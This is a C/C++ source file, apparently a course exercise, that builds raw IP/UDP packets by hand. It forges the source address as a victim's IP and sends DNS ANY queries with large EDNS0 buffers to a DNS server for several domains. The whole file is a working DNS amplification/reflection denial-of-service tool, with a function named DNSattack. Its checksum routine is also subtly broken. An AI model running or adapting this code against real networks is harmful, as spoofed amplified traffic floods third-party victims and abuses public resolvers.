#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include<arpa/inet.h>

using namespace std;

#define PAC_LENGTH 1024

struct QUESTION
{
	unsigned short qtype;
	unsigned short qclass;
};

struct addition{
	unsigned short type;
	unsigned short udp_payload_size;
	unsigned short rcode_edns0ver;
	unsigned short z;
	unsigned short datalen;
};

struct DNS_HEADER {
    u_int16_t id;       // identification number

    unsigned char rd :1;     // recursion desired
    unsigned char tc :1;     // truncated message
    unsigned char aa :1;     // authoritative answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1;     // query/response flag

    unsigned char rcode :4;  // response code
    unsigned char cd :1;     // checking disabled
    unsigned char ad :1;     // authenticated data
    unsigned char z :1;      // its z! reserved
    unsigned char ra :1;     // recursion available

    unsigned short q_count;  // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

unsigned short checksum(unsigned short *buf, int length){
    unsigned long sum = 0;
    for(;length>0;length--)
        sum += *buf;
    sum = (sum>>16) + (sum & 0xffff);
    sum += (sum>>16);
    return (unsigned short)(~sum);
}

int ChangetoDnsNameFormat(unsigned char* dns, unsigned char* host)
{
    int length = 0;
	int lock = 0, i;
	for (i = 0; i <= strlen((char*)host); i ++) {
		if (host[i] == '.' || host[i] == '\0') {
			*dns++ = i - lock;
            length++;
			for( ; lock < i; lock ++){
				*dns++ = host[lock];
                length++;
            }
			lock ++;
		}
	}
	*dns++ = '\0';
    length++;
    return length;
}

void DNSattack(char* victimIP, char* srcport, char* DNSserverIP, unsigned char hostname[]){
    u_int16_t src_port, dst_port;
    u_int32_t src_addr, dst_addr;
    src_addr = inet_addr(victimIP);
    dst_addr = inet_addr(DNSserverIP);
    src_port = atoi(srcport);
    dst_port = 53;
    
    char buffer[PAC_LENGTH];
    struct iphdr *ip = (struct iphdr *) buffer;
    struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
    struct DNS_HEADER *dns = (struct DNS_HEADER *) (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
    //unsigned char hostname[] = (unsigned char *)Hostname;
    struct QUESTION *qinfo = NULL;

    sockaddr_in address;
    int  one = 1;          //for the setsockopt
	const int *val = &one; //for the setsockopt

    memset(buffer, 0, PAC_LENGTH); //clean the buffer to 0

    // Create a raw socket with UDP protocol
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(fd == -1) printf("Fails to create socket\n");
    else printf("Create socket successfully\n");

    // inform the kernel do not fill up the packet structure
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(DNSserverIP);
    address.sin_port = htons(53);

    printf("Start to fabricate header....\n");

    //start to fabricate dns header
    dns->id = htons(0xEDCA);
	dns->qr = 0; //This is a query
	dns->opcode = 0; //This is a standard query
	dns->aa = 0; //Not Authoritative
	dns->tc = 0; //This message is not truncated
	dns->rd = 1; //Recursion Desired
	dns->ra = 1; //Recursion not available! hey we dont have it (lol)
	dns->z = 0;
	dns->ad = 0;
	dns->cd = 0;
	dns->rcode = 0;
	dns->q_count = htons(1); //we have only 1 question
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->add_count = htons(1);

    //start to fabricate dns query
    unsigned char *qname = (unsigned char *)(buffer + sizeof(iphdr) + sizeof(udphdr) + sizeof(DNS_HEADER));
    int DNS_query_length = ChangetoDnsNameFormat(qname, hostname);

    qinfo = (struct QUESTION *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_HEADER) + DNS_query_length);
    qinfo->qtype = htons(255); //AAAA:28 A:1 TXT:16
	qinfo->qclass = htons(1); //its internet 

    // format Additional sec.
	unsigned char *aname = (unsigned char *)(buffer + sizeof(iphdr) + sizeof(udphdr) + sizeof(DNS_HEADER) + DNS_query_length + sizeof(QUESTION));
	*aname = 0x00;
	addition *a = (addition *)(buffer + sizeof(iphdr) + sizeof(udphdr) + sizeof(DNS_HEADER) + DNS_query_length + sizeof(QUESTION) + 1);
	a->type = htons(41); // OPT
	a->udp_payload_size = htons(4096);
	a->rcode_edns0ver = htons(0x00);
	a->z = htons(0x8000);
	a->datalen = htons(0x00);

    //start to fabricate udp header
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_HEADER) + DNS_query_length + sizeof(QUESTION) + 1 + sizeof(addition));
    udp->check = 0; // disable checksum

    //start to fabricate ip header
    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 16; // low delay
    ip->tot_len  = sizeof(struct iphdr) + sizeof(struct udphdr)+ sizeof(DNS_HEADER) + DNS_query_length + sizeof(QUESTION) + 1 + sizeof(addition);
    ip->id       = htons(54321);
    ip->ttl      = 64; // hops
    ip->protocol = 17; // UDP
    ip->check = checksum((unsigned short *)buffer, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_HEADER) + DNS_query_length + sizeof(QUESTION) + 1 + sizeof(addition));
    ip->saddr = src_addr;
    ip->daddr = dst_addr;  

    int flag = sendto(fd, buffer, ip->tot_len, 0,(struct sockaddr *)&address, sizeof(address));
    if(flag == -1) printf("Fail to sent the packet\n");
    else printf("OK: one packet is sent.\n");

    close(fd);
}

int main(int argc, char *argv[]){
    DNSattack(argv[1], argv[2], argv[3], (unsigned char *)("nctu.edu.tw"));
    DNSattack(argv[1], argv[2], argv[3], (unsigned char *)("google.com"));
    DNSattack(argv[1], argv[2], argv[3], (unsigned char *)("ieee.org"));
    return 0;
}

